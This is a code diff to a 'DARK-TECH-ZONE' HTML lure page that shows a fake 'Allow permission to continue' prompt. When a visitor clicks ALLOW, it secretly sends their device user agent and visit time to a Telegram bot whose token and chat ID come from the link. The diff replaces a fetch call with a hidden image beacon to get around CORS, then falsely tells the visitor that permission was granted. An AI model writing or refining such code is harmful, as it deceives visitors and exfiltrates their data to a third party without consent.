@@ -21,10 +21,10 @@ body{
   width:90%;
   max-width:420px;
   background:#0b0b0b;
-  border-radius:12px;
+  border-radius:14px;
   padding:25px;
   text-align:center;
-  box-shadow:0 0 25px rgba(0,255,0,.25);
+  box-shadow:0 0 30px rgba(0,255,136,.35);
 }
 
 .loader{
@@ -44,7 +44,7 @@ body{
 
 button{
   width:100%;
-  padding:12px;
+  padding:13px;
   margin-top:15px;
   border:none;
   border-radius:8px;
@@ -65,26 +65,23 @@ button{
 
 .small{
   font-size:13px;
-  opacity:.8;
-  margin-top:10px;
+  opacity:.7;
+  margin-top:12px;
 }
 </style>
 </head>
 
 <body>
 
-<div class="box">
+<div class="box" id="box">
   <h2>Connecting…</h2>
   <div class="loader"></div>
-
-  <p>Please allow permission to continue</p>
+  <p>Allow permission to continue</p>
 
   <button class="allow" onclick="allowAccess()">ALLOW</button>
   <button class="deny" onclick="denyAccess()">DENY</button>
 
-  <div class="small">
-    Powered by DARK-TECH-ZONE
-  </div>
+  <div class="small">Powered by DARK-TECH-ZONE</div>
 </div>
 
 <script>
@@ -94,40 +91,33 @@ const chatId = params.get("chat");
 
 function allowAccess(){
   if(!token || !chatId){
-    alert("Invalid link");
+    alert("Invalid or broken link");
     return;
   }
 
-  const message =
-`📲 New Visitor Opened Link
-🌍 IP: (browser-based)
+  const text =
+`📲 Link Opened
 🕒 Time: ${new Date().toLocaleString()}
-🧭 User Agent: ${navigator.userAgent}`;
+📱 Device: ${navigator.userAgent}`;
 
-  fetch(`https://api.telegram.org/bot${token}/sendMessage`,{
-    method:"POST",
-    headers:{ "Content-Type":"application/json" },
-    body:JSON.stringify({
-      chat_id: chatId,
-      text: message
-    })
-  })
-  .then(()=> {
-    document.querySelector(".box").innerHTML = `
-      <h2>Connected</h2>
-      <p>Permission granted successfully.</p>
-      <div class="small">You may now close this page.</div>
-    `;
-  })
-  .catch(()=>{
-    alert("Connection failed");
-  });
+  const url =
+`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
+
+  // TELEGRAM SAFE METHOD (NO CORS)
+  const img = new Image();
+  img.src = url;
+
+  document.getElementById("box").innerHTML = `
+    <h2 style="color:#00ff88">Connected</h2>
+    <p>Permission granted successfully.</p>
+    <div class="small">You can close this page.</div>
+  `;
 }
 
 function denyAccess(){
-  document.querySelector(".box").innerHTML = `
-    <h2>Permission Denied</h2>
-    <p>You denied access.</p>
+  document.getElementById("box").innerHTML = `
+    <h2 style="color:#ff4444">Permission Denied</h2>
+    <p>Access was not allowed.</p>
     <div class="small">You may close this page.</div>
   `;
 }
